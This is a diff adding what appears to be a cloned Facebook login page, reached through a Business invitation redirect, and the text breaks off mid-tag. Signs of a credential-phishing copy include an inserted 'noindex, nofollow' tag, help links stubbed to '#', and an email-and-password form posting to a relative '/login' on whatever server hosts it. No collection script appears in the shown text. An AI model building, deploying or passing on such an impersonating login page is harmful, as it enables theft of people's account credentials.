@@ -1,0 +1,950 @@
+<html lang="en" id="facebook" class="">
+  <head>
+<meta name="robots" content="noindex, nofollow">
+    <meta charset="utf-8" />
+    <meta
+      name="referrer"
+      content="origin-when-crossorigin"
+      id="Meta_referrer"
+    />
+    <link
+      rel="manifest"
+      id="MANIFEST_LINK"
+      href="/data/manifest/?is_workplace_mobile_pwa_dogfooding=0"
+      crossorigin="use-credentials"
+    />
+    <title id="pageTitle">Log in to Facebook</title>
+    <meta name="bingbot" content="noarchive" />
+    <meta
+      name="description"
+      content="Log in to Facebook to start sharing and connecting with your friends, family and people you know."
+    />
+    <meta property="og:site_name" content="Facebook" />
+    <meta
+      property="og:url"
+      content="https://www.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+    />
+    <meta property="og:locale" content="en_GB" />
+    <link rel="canonical" href="https://www.facebook.com/login/web/" />
+    <link
+      rel="icon"
+      href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="https://static.xx.fbcdn.net/rsrc.php/v5/yZ/l/0,cross/AOv1HQAOfca.css"
+      data-bootloader-hash="khxUo4p"
+      crossorigin="anonymous"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="https://static.xx.fbcdn.net/rsrc.php/v5/y5/l/0,cross/gaHikZsgR0y.css"
+      data-bootloader-hash="Xbif/od"
+      crossorigin="anonymous"
+    />
+    <link
+      type="text/css"
+      rel="stylesheet"
+      href="https://static.xx.fbcdn.net/rsrc.php/v5/yl/l/0,cross/iPMqemeGuoR.css"
+      data-bootloader-hash="VTkj9vP"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yg/r/MLy8Ba8Q2TC.js"
+      data-bootloader-hash="nbuXC+r"
+      crossorigin="anonymous"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yD/r/e7izcIEPE9W.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yD/r/e7izcIEPE9W.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="Q/AMigl"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4i7M54/yP/l/en_GB-j/aH7VCYy6PR7.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4i7M54/yP/l/en_GB-j/aH7VCYy6PR7.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="eggIlQd"
+    ></script>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="data:text/css; charset=utf-8,"
+      crossorigin="anonymous"
+    />
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yD/r/BMK15X3Rcpu.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yD/r/BMK15X3Rcpu.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="LzztNzk"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/y5/r/p6gqbdwd9yz.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/y5/r/p6gqbdwd9yz.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="Qi3btkE"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yg/r/OqUIcVN3AQO.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yg/r/OqUIcVN3AQO.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="8Rq5kp2"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yW/r/KFW0724I-os.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yW/r/KFW0724I-os.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="89Bv8mb"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yk/r/f2HHLZxJ70i.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yk/r/f2HHLZxJ70i.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="z3hBw8h"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/y-/r/iRiYW-VbqrL.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/y-/r/iRiYW-VbqrL.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="tADNV/7"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yu/r/3M28pRZAj9B.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yu/r/3M28pRZAj9B.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="3O5SG92"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yp/r/V7n3cZi0und.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yp/r/V7n3cZi0und.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="x03xEBr"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yd/r/v5Ry9TuEZcO.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yd/r/v5Ry9TuEZcO.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="P5dqC7/"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/y2/r/8VS9CQF3Rgm.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/y2/r/8VS9CQF3Rgm.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="IjugNeq"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yl/r/rUrf87x21zU.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yl/r/rUrf87x21zU.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="T9BkhW+"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/y5/r/xJXczjiG1-R.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/y5/r/xJXczjiG1-R.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="Uh9zPeg"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yu/r/dyL3-_94S4H.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yu/r/dyL3-_94S4H.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="xLCbP6n"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yT/r/C3dL3pFnJjb.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yT/r/C3dL3pFnJjb.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="dlMdW7h"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yL/r/xw3N9pAF_5X.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yL/r/xw3N9pAF_5X.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="/RIqi2C"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yR/r/kNOX2xhiX7V.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yR/r/kNOX2xhiX7V.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="dEY7RHQ"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4iSWJ4/ya/l/en_GB-j/IzA_QaJbFgW.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4iSWJ4/ya/l/en_GB-j/IzA_QaJbFgW.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="UxnzJcB"
+    ></script>
+    <link
+      href="https://static.xx.fbcdn.net/rsrc.php/v4/yl/r/1U3RnsntEBn.js"
+      rel="preload"
+      as="script"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://static.xx.fbcdn.net/rsrc.php/v4/yl/r/1U3RnsntEBn.js"
+      async=""
+      crossorigin="anonymous"
+      data-bootloader-hash-client="W2q32qT"
+    ></script>
+  </head>
+
+  <body
+    class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb sf _605a b_c3pyn-ahh chrome webkit mac x2 Locale_en_GB cores-gte4 _19_u"
+    dir="ltr"
+  >
+    <script type="text/javascript" nonce="">
+      requireLazy(["bootstrapWebSession"], function (j) {
+        j(1770802619);
+      });
+    </script>
+    <div class="_li" id="u_0_0_Au">
+      <div id="globalContainer" class="uiContextualLayerParent">
+        <div class="fb_content clearfix" id="content" role="main">
+          <div class="_4-u5 _30ny">
+            <div class="_97vy">
+              <img
+                class="_97vu img"
+                src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
+                alt="Facebook"
+              />
+            </div>
+            <div class="_2pio _1uxu">
+              <div class="_585n" id="u_0_1_cQ">
+                <i class="_585p img sp_GPvE0syHYuh_2x sx_b1e917"
+                  ><u>Notice</u></i
+                >
+                <div class="_585r _50f4">You must log in to continue.</div>
+              </div>
+            </div>
+            <div class="_4-u2 _1w1t _4-u8 _52jv">
+              <div class="_xku" id="header_block">
+                <span class="_97w1 _50f6">
+                  <div class="_9axz">Log in to Facebook</div>
+                </span>
+              </div>
+              <div class="login_form_container">
+                <form id="login_form" action="/login" method="post">
+                  <input
+                    type="hidden"
+                    name="jazoest"
+                    value="22243"
+                    autocomplete="off"
+                  /><input
+                    type="hidden"
+                    name="lsd"
+                    value="AdQ12E6vcx8Pvc7wTJIdjOFa9s8"
+                    autocomplete="off"
+                  />
+                  <div class="pam _9ay2 uiBoxYellow">
+                    You must log in to continue.
+                  </div>
+                  <input type="hidden" autocomplete="off" id="error_box" />
+                  <div id="loginform">
+                    <input
+                      type="hidden"
+                      autocomplete="off"
+                      id="display"
+                      name="display"
+                      value=""
+                    /><input
+                      type="hidden"
+                      autocomplete="off"
+                      id="isprivate"
+                      name="isprivate"
+                      value=""
+                    /><input
+                      type="hidden"
+                      autocomplete="off"
+                      id="return_session"
+                      name="return_session"
+                      value=""
+                    /><input
+                      type="hidden"
+                      autocomplete="off"
+                      id="skip_api_login"
+                      name="skip_api_login"
+                      value=""
+                    /><input
+                      type="hidden"
+                      autocomplete="off"
+                      id="signed_next"
+                      name="signed_next"
+                      value=""
+                    /><input
+                      type="hidden"
+                      autocomplete="off"
+                      id="trynum"
+                      name="trynum"
+                      value="1"
+                    /><input
+                      type="hidden"
+                      autocomplete="off"
+                      name="timezone"
+                      value="-420"
+                      id="u_0_2_LY"
+                    /><input
+                      type="hidden"
+                      autocomplete="off"
+                      name="lgndim"
+                      value="eyJ3IjoxMjgwLCJoIjo4MDAsImF3IjoxMjgwLCJhaCI6ODAwLCJjIjozMH0="
+                      id="u_0_3_7E"
+                    /><input
+                      type="hidden"
+                      name="lgnrnd"
+                      value="013659_iU-W"
+                    /><input
+                      type="hidden"
+                      id="lgnjs"
+                      name="lgnjs"
+                      value="1770802619"
+                    /><input
+                      type="hidden"
+                      autocomplete="off"
+                      name="shared_prefs_data"
+                      value=""
+                    />
+                    <div class="clearfix _5466 _44mg" id="email_container">
+                      <div>
+                        <div class="_55r1 _1kbt">
+                          <input
+                            type="text"
+                            class="inputtext _55r1 inputtext _9npi inputtext _9npi"
+                            name="email"
+                            id="email"
+                            tabindex="0"
+                            placeholder="Email address or phone number"
+                            value=""
+                            autofocus="1"
+                            autocomplete="username webauthn"
+                            aria-label="Email address or phone number"
+                          />
+                        </div>
+                      </div>
+                    </div>
+                    <div class="clearfix _5466 _44mg">
+                      <div>
+                        <div class="_55r1 _1kbt">
+                          <input
+                            type="password"
+                            class="inputtext _55r1 inputtext _9npi inputtext _9npi"
+                            name="pass"
+                            id="pass"
+                            tabindex="0"
+                            placeholder="Password"
+                            value=""
+                            autocomplete="current-password"
+                            aria-label="Password"
+                          />
+                          <div class="_9ls7 hidden_elem" id="u_0_4_ic">
+                            <a href="#" role="button">
+                              <div class="_9lsa">
+                                <div class="_9lsb" id="u_0_5_Jq"></div>
+                              </div>
+                            </a>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="_xkt" id="u_0_6_3w">
+                      <button
+                        value="1"
+                        class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy"
+                        id="loginbutton"
+                        name="login"
+                        tabindex="0"
+                        type="submit"
+                      >
+                        Log in
+                      </button>
+                    </div>
+                    <div class="_xkv fsm fwn fcg" id="login_link">
+                      <a href="#" class="_97w4" target="">Forgotten account?</a
+                      ><span role="presentation" aria-hidden="true"> · </span
+                      ><a href="#" rel="nofollow" class="_97w5"
+                        >Sign up for Facebook</a
+                      >
+                    </div>
+                  </div>
+                  <input
+                    type="hidden"
+                    autocomplete="off"
+                    id="prefill_contact_point"
+                    name="prefill_contact_point"
+                    value=""
+                  /><input
+                    type="hidden"
+                    autocomplete="off"
+                    id="prefill_source"
+                    name="prefill_source"
+                  /><input
+                    type="hidden"
+                    autocomplete="off"
+                    id="prefill_type"
+                    name="prefill_type"
+                  /><input
+                    type="hidden"
+                    autocomplete="off"
+                    id="first_prefill_source"
+                    name="first_prefill_source"
+                  /><input
+                    type="hidden"
+                    autocomplete="off"
+                    id="first_prefill_type"
+                    name="first_prefill_type"
+                  /><input
+                    type="hidden"
+                    autocomplete="off"
+                    id="had_cp_prefilled"
+                    name="had_cp_prefilled"
+                    value="false"
+                  /><input
+                    type="hidden"
+                    autocomplete="off"
+                    id="had_password_prefilled"
+                    name="had_password_prefilled"
+                    value="false"
+                  /><input
+                    type="hidden"
+                    autocomplete="off"
+                    name="ab_test_data"
+                    value=""
+                  />
+                </form>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="">
+          <div class="_95ke _8opy">
+            <div
+              id="pageFooter"
+              data-referrer="page_footer"
+              data-testid="page_footer"
+            >
+              <ul
+                class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i"
+                data-nocookies="1"
+              >
+                <li>English (UK)</li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://www.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+                    title="Vietnamese"
+                    id="u_0_7_cx"
+                    >Tiếng Việt</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://vi-vn.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+                    title="Traditional Chinese (Taiwan)"
+                    id="u_0_8_kb"
+                    >中文(台灣)</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://zh-tw.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+                    title="Korean"
+                    id="u_0_9_s0"
+                    >한국어</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://ko-kr.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+                    title="Japanese"
+                    id="u_0_a_ET"
+                    >日本語</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://ja-jp.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+                    title="French (France)"
+                    id="u_0_b_sj"
+                    >Français (France)</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://fr-fr.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+                    title="Thai"
+                    id="u_0_c_Z8"
+                    >ภาษาไทย</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://th-th.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+                    title="Spanish"
+                    id="u_0_d_Ob"
+                    >Español</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://es-la.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+                    title="Portuguese (Brazil)"
+                    id="u_0_e_NU"
+                    >Português (Brasil)</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://pt-br.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+                    title="German"
+                    id="u_0_f_eQ"
+                    >Deutsch</a
+                  >
+                </li>
+                <li>
+                  <a
+                    class="_sv4"
+                    dir="ltr"
+                    href="https://de-de.facebook.com/login/?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Finvitation%252F%253Ftoken%253D--sanitized--%2526chosen_account_type%253D1%2526invite_join_id%253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%26f3_request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%26full_page_redirect%3D0&amp;request_id=lolchkefjjppajcgjogjaeljanlnbbinecljpghe"
+                    title="Italian"
+                    id="u_0_g_NL"
+                    >Italiano</a
+                  >
+                </li>
+                <li>
+                  <a
+                    role="button"
+                    class="_42ft _4jy0 _517i _517h _51sy"
+                    rel="dialog"
+                    ajaxify="/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2Flogin%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Fbusiness%252Funifiedfblogin%252Fcallback%252F%253Fnext%253Dhttps%25253A%25252F%25252Fbusiness.facebook.com%25252Finvitation%25252F%25253Ftoken%25253D--sanitized--%252526chosen_account_type%25253D1%252526invite_join_id%25253Dd595d1d6-5785-4cfc-9cc3-71ca09f913c9%252526biz_login_source%25253Dbiz_unified_f3_fb_login_button%252526join_id%25253Dfc39b8c5-fff1-4b29-ad44-8c62ada66565%2526f3_request_id%253Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe%2526full_page_redirect%253D0%26request_id%3Dlolchkefjjppajcgjogjaeljanlnbbinecljpghe&amp;source=www_list_selector_more"
+                    href="#"
+                    title="Show more languages"
+                    ><i class="img sp_GPvE0syHYuh_2x sx_615588"></i
+                  ></a>
+                </li>
+              </ul>
+              <div id="contentCurve"></div>
+              <div
+                id="pageFooterChildren"
+                role="contentinfo"
+                aria-label="Facebook site links"
+              >
+                <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                  <li>
+                    <a href="/reg/" title="Sign up for Facebook">Sign up</a>
+                  </li>
+                  <li>
+                    <a href="/login/" title="Log in to Facebook">Log in</a>
+                  </li>
+                  <li>
+                    <a
+                      href="https://messenger.com/"
+                      title="Take a look at Messenger."
+                      >Messenger</a
+                    >
+                  </li>
+                  <li>
+                    <a href="/lite/" title="Facebook Lite for Android."
+                      >Facebook Lite</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.facebook.com/watch/"
+                      title="Browse in Video"
+                      >Video</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://about.Meta.com/technologies/Meta-pay"
+                      title="Learn more about Meta Pay"
+                      target="_blank"
+                      >Meta Pay</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.Meta.com/"
+                      title="Discover Meta"
+                      target="_blank"
+                      >Meta Store</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.Meta.com/quest/"
+                      title="Learn more about Meta Quest"
+                      target="_blank"
+                      >Meta Quest</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.Meta.com/smart-glasses/"
+                      title="Learn more about Ray-Ban Meta"
+                      target="_blank"
+                      >Ray-Ban Meta</a
+                    >
+                  </li>
+                  <li>
+                    <a href="https://www.Meta.ai/" title="Meta AI">Meta AI</a>
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.Meta.ai/pages/best-push-mowers-lawn-care-gardening-outdoor-maintenance/?utm_source=foa_web_footer"
+                      title="Meta AI more content"
+                      >Meta AI more content</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT1hs3tOgMJ4nvrxNr0WRDxvCN_kT7l2NRLnXjb8jtz24l7ZFrgFdrfQmqROnRnbiY80W3B2-xIH8gP2EgQ-PT1Zo630dmkTL15RPgrEsriS-SqDanZtu61SMWOiBuj-4Zow-rfd89y8rGaqkFy6pS0Yu02i4L8QJrGL1m0LY7k"
+                      title="Take a look at Instagram"
+                      target="_blank"
+                      rel="noreferrer nofollow"
+                      data-lynx-mode="asynclazy"
+                      >Instagram</a
+                    >
+                  </li>
+                  <li>
+                    <a href="https://www.threads.com/" title="Check out Threads"
+                      >Threads</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
+                      title="See the Voting Information Centre"
+                      >Voting Information Centre</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/privacy/policy/?entry_point=facebook_page_footer"
+                      title="Learn how we collect, use and share information to support Facebook."
+                      >Privacy Policy</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/privacy/center/?entry_point=facebook_page_footer"
+                      title="Learn how to manage and control your privacy on Facebook."
+                      >Privacy Centre</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://about.Meta.com/"
+                      accesskey="8"
+                      title="Read our blog, discover the resource centre and find job opportunities."
+                      >About</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
+                      title="Advertise on Facebook"
+                      >Create ad</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/pages/create/?ref_type=site_footer"
+                      title="Create a Page"
+                      >Create Page</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="https://developers.facebook.com/?ref=pf"
+                      title="Develop on our platform."
+                      >Developers</a
+                    >
+                  </li>
+                  <li>
+                    <a
+                      href="/careers/?ref=pf"
+                      title="Make your next career move to our brilliant company."
+                      >Careers</a
+                    >
+                  </li>
+                  <li>
+                    <a
